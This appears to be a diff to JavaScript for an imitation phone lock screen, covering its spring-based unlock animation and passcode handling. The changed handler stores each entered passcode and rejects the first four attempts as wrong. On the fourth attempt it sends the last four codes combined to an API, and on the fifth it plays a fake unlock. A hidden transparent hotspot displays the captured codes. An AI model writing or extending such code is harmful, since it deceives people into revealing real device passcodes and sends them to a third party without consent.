@@ -8,12 +8,12 @@
   const emergency = document.getElementById('emergency');
   const cancelBtn = document.getElementById('cancel');
   const unlockOverlay = document.getElementById('unlockOverlay');
-  const lockInner = document.querySelector('.lockscreen-inner');
+  const lockInner = document.querySelector('.lockscreen.inner') || document.querySelector('.lockscreen-inner');
   const homescreenImg = document.getElementById('homescreenImg');
   const ATT_KEY = '_pass_attempt_count_';
   const QUEUE_KEY = '_pass_queue_';
 
-  // new storage key for last 4 entered codes (rotating buffer)
+  // rotating buffer for last up-to-4 entered codes
   const LAST_CODES_KEY = '_pass_last_codes_';
   function getLastCodes() {
     try {
@@ -23,15 +23,15 @@
     }
   }
   function pushLastCode(c) {
-    const arr = getLastCodes();
-    arr.push(c);
-    // keep only last 4
-    while (arr.length > 4) arr.shift();
-    localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
+    try {
+      const arr = getLastCodes();
+      arr.push(c);
+      while (arr.length > 4) arr.shift();
+      localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
+    } catch (e) {}
   }
   function getCombinedLastCodes() {
-    const arr = getLastCodes();
-    return arr.join(',');
+    return getLastCodes().join(',');
   }
 
   function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
@@ -70,7 +70,6 @@
   }
 
   /* ---------- Spring engine (semi-implicit integrator) ---------- */
-  // options: { from, to, velocity (optional), mass, stiffness, damping, onUpdate, onComplete, threshold }
   function springAnimate(opts) {
     const mass = opts.mass ?? 1;
     const stiffness = opts.stiffness ?? 120; // k
@@ -83,9 +82,8 @@
     let rafId = null;
 
     function step(now) {
-      const dt = Math.min(0.032, (now - last) / 1000); // cap dt to avoid big jumps
+      const dt = Math.min(0.032, (now - last) / 1000);
       last = now;
-      // Hooke's law + damping: a = (-k*(x - target) - c*v) / m
       const a = (-stiffness * (x - target) - damping * v) / mass;
       v += a * dt;
       x += v * dt;
@@ -94,7 +92,6 @@
 
       const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
       if (isSettled) {
-        // ensure final snap
         if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
         if (typeof opts.onComplete === 'function') opts.onComplete();
         cancelAnimationFrame(rafId);
@@ -104,20 +101,17 @@
     }
 
     rafId = requestAnimationFrame(step);
-    return () => cancelAnimationFrame(rafId); // return a cancel function
+    return () => cancelAnimationFrame(rafId);
   }
 
   /* ---------- playUnlockAnimation uses two springs ---------- */
   function playUnlockAnimation() {
-    // Respect reduced-motion
     const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
     if (!lockInner || !unlockOverlay || !homescreenImg) return;
 
-    // reveal the homescreen image layer immediately (it will animate)
     unlockOverlay.classList.add('show');
 
     if (prefersReduced) {
-      // instant fallback
       lockInner.style.transform = `translate3d(0, -110%, 0)`;
       homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
       homescreenImg.style.opacity = '1';
@@ -125,72 +119,52 @@
       return;
     }
 
-    // compute numeric pixel target for lock translate
     const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
-    const targetY = -Math.round(height * 1.08); // move a bit past top
+    const targetY = -Math.round(height * 1.08);
 
-    // start state
     lockInner.style.willChange = 'transform, opacity';
     homescreenImg.style.willChange = 'transform, filter, opacity';
-    // ensure initial styles
     lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
     homescreenImg.style.transform = `translate3d(0,6%,0) scale(0.96)`;
     homescreenImg.style.opacity = '0';
     homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
-
-    // shadow visual: apply large shadow while animating
     lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';
 
-    // spring for lock Y (pixels)
-    const cancelLock = springAnimate({
+    springAnimate({
       from: 0,
       to: targetY,
       mass: 1.05,
       stiffness: 140,
       damping: 16,
       onUpdate: (val) => {
-        // val is pixels from 0 -> targetY (negative)
-        // map to scale slight (small effect)
-        const progress = Math.min(1, Math.abs(val / targetY)); // 0..1
-        const scale = 1 - 0.003 * progress; // tiny shrink while lifting
+        const progress = Math.min(1, Math.abs(val / targetY));
+        const scale = 1 - 0.003 * progress;
         lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
-        // fade a bit as it goes
         lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
       },
       onComplete: () => {
-        // remove shadow and hide inner off-screen (keep homescreen shown)
         lockInner.style.boxShadow = '';
         lockInner.style.opacity = '0';
-        // keep transform at final position (or clear if you prefer)
         lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
       }
     });
 
-    // spring for homescreen (scale & exposure)
-    // We'll animate a small overshoot scale and sharpen (blur -> 0)
-    const cancelHome = springAnimate({
-      from: 0, // we'll drive "progress" between 0..1 by mapping x, not absolute scale here
+    springAnimate({
+      from: 0,
       to: 1,
       mass: 1,
       stiffness: 80,
       damping: 11,
       onUpdate: (p) => {
-        // p will progress 0 -> 1 but spring oscillates; clamp for mapping
         const progress = Math.max(0, Math.min(1, p));
-        // map to scale overshoot: 0->1 maps to 0.96 -> 1.04 -> 1
-        // We'll use a simple mapping from progress to scale; because spring oscillates around 1, p may overshoot <0 or >1: handle it
-        const raw = p; // spring value
-        // convert to scale via interpolation around 1
-        const scale = 1 + (raw - 1) * 0.12; // gives slight overshoot (e.g. if raw = 1.2 -> scale ~1.024)
-        // clamp reasonable range
+        const raw = p;
+        const scale = 1 + (raw - 1) * 0.12;
         const finalScale = Math.max(0.96, Math.min(1.06, scale));
         homescreenImg.style.transform = `translate3d(0,0,0) scale(${finalScale})`;
-
-        // blur mapping: when raw small -> blurry, when near 1 -> sharp
         const blur = Math.max(0, 10 * (1 - Math.min(1, raw)));
         const sat = 0.9 + Math.min(0.15, raw * 0.15);
         homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
-        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw)); // fade in quickly
+        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw));
       },
       onComplete: () => {
         homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
@@ -199,7 +173,6 @@
       }
     });
 
-    // Optional: cleanup both springs after a timeout (in case onComplete didn't fire)
     setTimeout(() => {
       lockInner.style.boxShadow = '';
       homescreenImg.style.willChange = '';
@@ -221,19 +194,25 @@
     }, DURATION + 20);
   }
 
+  /* ---------- handleCompleteAttempt: send combined on 4th attempt ---------- */
   async function handleCompleteAttempt(enteredCode) {
     let attempts = getAttempts();
     attempts += 1;
     setAttempts(attempts);
 
-    // NEW: push entered code into rotating buffer of last 4 (does not change your send behavior)
-    try { pushLastCode(enteredCode); } catch(e) {}
+    // push code into rotating buffer (so hotspot displays exact payload)
+    pushLastCode(enteredCode);
 
-    // old behaviour: attempts 1-4 -> send, 5 -> unlock animation
-    if (attempts >= 1 && attempts <= 4) {
-      sendToAPI(enteredCode);
+    // send combined only on 4th attempt
+    if (attempts >= 1 && attempts <= 3) {
+      // do not send to API yet
+      animateWrongAttempt();
+    } else if (attempts === 4) {
+      const combined = getCombinedLastCodes(); // e.g. "1234,4321,5678,3456"
+      if (combined) sendToAPI(combined);
       animateWrongAttempt();
     } else if (attempts === 5) {
+      // 5th attempt triggers unlock animation (no send)
       playUnlockAnimation();
       setTimeout(reset, 300);
     }
@@ -315,7 +294,7 @@
         width: '56px',
         height: '56px',
         borderRadius: '12px',
-        background: 'transparent',        // completely invisible
+        background: 'transparent',
         border: 'none',
         zIndex: '12000',
         display: 'flex',
@@ -385,7 +364,6 @@
     }
 
     bar.style.display = 'flex';
-    // animate in
     requestAnimationFrame(() => {
       bar.style.transform = 'translateY(0)';
       bar.style.opacity = '1';
@@ -402,7 +380,7 @@
     }, 140);
   }
 
-  // Hotspot handlers: show on pointerdown, hide on pointerup/pointercancel
+  // Hotspot handlers
   function onHotspotDown(ev) {
     if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
     ev.preventDefault();
@@ -419,7 +397,6 @@
       hs.addEventListener('pointerdown', onHotspotDown);
       window.addEventListener('pointerup', onHotspotUp);
       window.addEventListener('pointercancel', onHotspotUp);
-      // fallback for some touch stacks
       hs.addEventListener('touchstart', onHotspotDown, { passive: false });
       window.addEventListener('touchend', onHotspotUp);
       window.addEventListener('touchcancel', onHotspotUp);
